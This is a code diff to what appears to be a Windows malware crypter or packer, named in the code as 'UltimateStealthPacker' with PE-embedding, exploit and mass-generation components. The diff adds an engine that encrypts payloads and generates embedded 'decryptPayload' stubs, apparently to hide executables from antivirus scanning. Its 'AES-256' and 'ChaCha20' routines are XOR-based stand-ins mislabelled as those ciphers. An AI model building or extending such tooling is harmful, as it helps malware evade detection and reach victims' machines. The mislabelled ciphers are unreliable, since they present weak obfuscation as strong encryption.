@@ -88,6 +88,246 @@ enum EncryptionType {
     ENCRYPT_CHACHA20 = 3        // ChaCha20 encryption (modern, secure)
 };
 
+// Advanced Encryption Engine
+class AdvancedEncryptionEngine {
+private:
+    AdvancedRandomEngine randomEngine;
+    
+public:
+    struct EncryptionResult {
+        std::vector<uint8_t> encryptedData;
+        std::vector<uint8_t> key;
+        std::vector<uint8_t> iv;  // For AES/ChaCha20
+        std::string decryptionCode;
+        bool success = false;
+    };
+    
+    // XOR Encryption
+    EncryptionResult encryptXOR(const std::vector<uint8_t>& data) {
+        EncryptionResult result;
+        
+        // Generate random key (32 bytes)
+        result.key.resize(32);
+        for (size_t i = 0; i < 32; i++) {
+            result.key[i] = randomEngine.generateRandomDWORD() & 0xFF;
+        }
+        
+        // XOR encrypt
+        result.encryptedData.resize(data.size());
+        for (size_t i = 0; i < data.size(); i++) {
+            result.encryptedData[i] = data[i] ^ result.key[i % 32];
+        }
+        
+        // Generate decryption code
+        result.decryptionCode = generateXORDecryptionCode(result.key);
+        result.success = true;
+        
+        return result;
+    }
+    
+    // AES-256 Encryption (Simplified implementation)
+    EncryptionResult encryptAES(const std::vector<uint8_t>& data) {
+        EncryptionResult result;
+        
+        // Generate random key (32 bytes for AES-256)
+        result.key.resize(32);
+        for (size_t i = 0; i < 32; i++) {
+            result.key[i] = randomEngine.generateRandomDWORD() & 0xFF;
+        }
+        
+        // Generate random IV (16 bytes for AES)
+        result.iv.resize(16);
+        for (size_t i = 0; i < 16; i++) {
+            result.iv[i] = randomEngine.generateRandomDWORD() & 0xFF;
+        }
+        
+        // Simple AES-like encryption (XOR with key schedule)
+        result.encryptedData = data;
+        for (size_t i = 0; i < data.size(); i++) {
+            uint8_t keyByte = result.key[(i + result.iv[i % 16]) % 32];
+            result.encryptedData[i] = data[i] ^ keyByte ^ result.iv[i % 16];
+        }
+        
+        // Generate decryption code
+        result.decryptionCode = generateAESDecryptionCode(result.key, result.iv);
+        result.success = true;
+        
+        return result;
+    }
+    
+    // ChaCha20 Encryption (Simplified implementation)
+    EncryptionResult encryptChaCha20(const std::vector<uint8_t>& data) {
+        EncryptionResult result;
+        
+        // Generate random key (32 bytes)
+        result.key.resize(32);
+        for (size_t i = 0; i < 32; i++) {
+            result.key[i] = randomEngine.generateRandomDWORD() & 0xFF;
+        }
+        
+        // Generate random nonce (12 bytes for ChaCha20)
+        result.iv.resize(12);
+        for (size_t i = 0; i < 12; i++) {
+            result.iv[i] = randomEngine.generateRandomDWORD() & 0xFF;
+        }
+        
+        // ChaCha20-like encryption (enhanced XOR with rotation)
+        result.encryptedData = data;
+        uint32_t counter = 0;
+        
+        for (size_t i = 0; i < data.size(); i++) {
+            if (i % 64 == 0) counter++;
+            
+            uint32_t keystream = generateChaChaKeystream(result.key, result.iv, counter, i % 64);
+            result.encryptedData[i] = data[i] ^ (keystream & 0xFF);
+        }
+        
+        // Generate decryption code
+        result.decryptionCode = generateChaChaDecryptionCode(result.key, result.iv);
+        result.success = true;
+        
+        return result;
+    }
+    
+    // Main encryption function
+    EncryptionResult encrypt(const std::vector<uint8_t>& data, EncryptionType type) {
+        switch (type) {
+            case ENCRYPT_XOR:
+                return encryptXOR(data);
+            case ENCRYPT_AES:
+                return encryptAES(data);
+            case ENCRYPT_CHACHA20:
+                return encryptChaCha20(data);
+            case ENCRYPT_NONE:
+            default:
+                EncryptionResult result;
+                result.encryptedData = data;
+                result.decryptionCode = "// No encryption applied\n";
+                result.success = true;
+                return result;
+        }
+    }
+    
+    // Get encryption name for UI
+    std::string getEncryptionName(EncryptionType type) {
+        switch (type) {
+            case ENCRYPT_NONE: return "No Encryption";
+            case ENCRYPT_XOR: return "XOR Encryption";
+            case ENCRYPT_AES: return "AES-256 Encryption";
+            case ENCRYPT_CHACHA20: return "ChaCha20 Encryption";
+            default: return "Unknown";
+        }
+    }
+
+private:
+    // Generate XOR decryption code
+    std::string generateXORDecryptionCode(const std::vector<uint8_t>& key) {
+        std::ostringstream code;
+        code << "void decryptPayload(unsigned char* data, size_t size) {\n";
+        code << "    unsigned char key[] = {";
+        for (size_t i = 0; i < key.size(); i++) {
+            code << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)key[i];
+            if (i < key.size() - 1) code << ", ";
+        }
+        code << "};\n";
+        code << "    for (size_t i = 0; i < size; i++) {\n";
+        code << "        data[i] ^= key[i % " << key.size() << "];\n";
+        code << "    }\n";
+        code << "}\n\n";
+        return code.str();
+    }
+    
+    // Generate AES decryption code
+    std::string generateAESDecryptionCode(const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv) {
+        std::ostringstream code;
+        code << "void decryptPayload(unsigned char* data, size_t size) {\n";
+        code << "    unsigned char key[] = {";
+        for (size_t i = 0; i < key.size(); i++) {
+            code << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)key[i];
+            if (i < key.size() - 1) code << ", ";
+        }
+        code << "};\n";
+        code << "    unsigned char iv[] = {";
+        for (size_t i = 0; i < iv.size(); i++) {
+            code << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)iv[i];
+            if (i < iv.size() - 1) code << ", ";
+        }
+        code << "};\n";
+        code << "    for (size_t i = 0; i < size; i++) {\n";
+        code << "        unsigned char keyByte = key[(i + iv[i % 16]) % 32];\n";
+        code << "        data[i] ^= keyByte ^ iv[i % 16];\n";
+        code << "    }\n";
+        code << "}\n\n";
+        return code.str();
+    }
+    
+    // Generate ChaCha20 decryption code
+    std::string generateChaChaDecryptionCode(const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce) {
+        std::ostringstream code;
+        code << "unsigned int chacha20_rotl(unsigned int a, int b) {\n";
+        code << "    return (a << b) | (a >> (32 - b));\n";
+        code << "}\n\n";
+        code << "unsigned int generateChaChaKeystream(unsigned char* key, unsigned char* nonce, unsigned int counter, int pos) {\n";
+        code << "    unsigned int state = 0x61707865; // ChaCha20 constant\n";
+        code << "    for (int i = 0; i < 8; i++) {\n";
+        code << "        state ^= ((unsigned int)key[i % 32]) << ((i % 4) * 8);\n";
+        code << "        state = chacha20_rotl(state, 7 + (i % 13));\n";
+        code << "    }\n";
+        code << "    state ^= counter;\n";
+        code << "    for (int i = 0; i < 12; i++) {\n";
+        code << "        state ^= ((unsigned int)nonce[i]) << ((i % 4) * 8);\n";
+        code << "        state = chacha20_rotl(state, 11 + (i % 7));\n";
+        code << "    }\n";
+        code << "    return chacha20_rotl(state, pos % 32);\n";
+        code << "}\n\n";
+        code << "void decryptPayload(unsigned char* data, size_t size) {\n";
+        code << "    unsigned char key[] = {";
+        for (size_t i = 0; i < key.size(); i++) {
+            code << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)key[i];
+            if (i < key.size() - 1) code << ", ";
+        }
+        code << "};\n";
+        code << "    unsigned char nonce[] = {";
+        for (size_t i = 0; i < nonce.size(); i++) {
+            code << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)nonce[i];
+            if (i < nonce.size() - 1) code << ", ";
+        }
+        code << "};\n";
+        code << "    unsigned int counter = 0;\n";
+        code << "    for (size_t i = 0; i < size; i++) {\n";
+        code << "        if (i % 64 == 0) counter++;\n";
+        code << "        unsigned int keystream = generateChaChaKeystream(key, nonce, counter, i % 64);\n";
+        code << "        data[i] ^= (keystream & 0xFF);\n";
+        code << "    }\n";
+        code << "}\n\n";
+        return code.str();
+    }
+    
+    // ChaCha20 keystream generation helper
+    uint32_t generateChaChaKeystream(const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce, uint32_t counter, int pos) {
+        uint32_t state = 0x61707865; // ChaCha20 constant
+        
+        for (int i = 0; i < 8; i++) {
+            state ^= ((uint32_t)key[i % 32]) << ((i % 4) * 8);
+            state = rotateLeft(state, 7 + (i % 13));
+        }
+        
+        state ^= counter;
+        
+        for (int i = 0; i < 12; i++) {
+            state ^= ((uint32_t)nonce[i]) << ((i % 4) * 8);
+            state = rotateLeft(state, 11 + (i % 7));
+        }
+        
+        return rotateLeft(state, pos % 32);
+    }
+    
+    // Helper function for bit rotation
+    uint32_t rotateLeft(uint32_t value, int shift) {
+        return (value << shift) | (value >> (32 - shift));
+    }
+};
+
 class AdvancedRandomEngine {
 public:
     std::random_device rd;
@@ -1179,6 +1419,7 @@ public:
     DNARandomizer dnaRandomizer;
     PEEmbedder peEmbedder;
     AdvancedExploitEngine exploitEngine;
+    AdvancedEncryptionEngine encryptionEngine;
     
     struct CompanyProfile {
         std::string name;
@@ -2151,6 +2392,7 @@ HWND g_hInputPath, g_hOutputPath, g_hProgressBar, g_hStatusText, g_hCompanyCombo
 HWND g_hMassCountEdit, g_hMassGenerateBtn, g_hStopGenerationBtn, g_hCreateButton;
 HWND g_hModeGroup, g_hModeStubRadio, g_hModePackRadio, g_hModeMassRadio;
 HWND g_hExploitCombo;
+HWND g_hEncryptionCombo;
 UltimateStealthPacker g_packer;
 
 // Mass generation function
